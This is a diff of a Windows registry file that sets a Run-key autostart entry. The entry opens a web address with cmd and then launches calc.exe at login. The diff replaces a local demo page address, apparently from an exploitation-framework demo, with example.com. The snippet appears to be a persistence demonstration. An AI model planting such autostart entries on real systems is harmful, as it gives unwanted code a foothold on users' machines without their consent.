@@ -1,7 +1,7 @@
 Windows Registry Editor Version 5.00
 
 [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
-"TaskManagerURL"="cmd /c start http://192.168.1.10:3000/demos/butcher/index.html && calc.exe"
+"TaskManagerURL"="cmd /c start http://www.example.com && calc.exe"
 
 # This is another method, but using the powershell, just remove the # from each line
 
